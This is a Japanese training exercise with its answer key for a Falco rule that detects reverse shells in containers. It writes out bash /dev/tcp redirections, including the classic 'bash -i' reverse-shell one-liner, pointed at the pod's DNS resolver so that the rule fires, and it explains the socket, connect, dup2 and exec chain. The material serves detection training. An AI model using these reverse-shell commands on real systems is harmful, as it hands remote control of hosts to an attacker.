# 08 — C2 Beacon

C2 (command-and-control) シナリオ。`Redirect STDOUT/STDIN to Network
Connection in Container` ルールは reverse shell 系の挙動を検知:
**network socket fd を stdin/stdout/stderr に dup する** という、
リバースシェル payload の必須操作を捕まえる。

## 想定解

⚠ egress lockdown (P11.5) 環境では collector / DNS / API server 以外への
outbound が silently drop され、`connect()` がハングして `dup2` に到達
しない (= 発火しない)。**接続先は常に許可されている Pod 自身の DNS
リゾルバにする** (`/etc/resolv.conf` の `nameserver`):

```bash
DNS=$(awk '/^nameserver/{print $2; exit}' /etc/resolv.conf)
bash -c "exec 1<>/dev/tcp/$DNS/53"
# bash の <> は: connect (DNS サーバは TCP 53 も受け付けるので即成立) → dup2(socketfd, 1)
# → "Redirect STDOUT/STDIN to Network Connection in Container" 発火
```

ポイント: alpine 3.20 の bash は `/dev/tcp/<host>/<port>` を built-in で
サポート (`enable_net_redirections` コンパイル時オプション)。

別解:
```bash
# 古典的 reverse shell pattern
DNS=$(awk '/^nameserver/{print $2; exit}' /etc/resolv.conf)
bash -i >& /dev/tcp/$DNS/53 0>&1
```

## 解説

- Falco の rule condition: `dup` syscall + container + `fd.type in
  ("ipv4", "ipv6")` + `evt.rawres in (0,1,2)` (= stdin/stdout/stderr)
- 攻撃者の手口: reverse shell payload は **`socket() → connect() →
  dup2(sock, 0/1/2) → exec(/bin/sh)`** の流れ。3 番目の dup2 を Falco が捕まえる
- 本番防御: NetworkPolicy で outbound 全 deny / Sysdig Secure の
  process-tree based detection
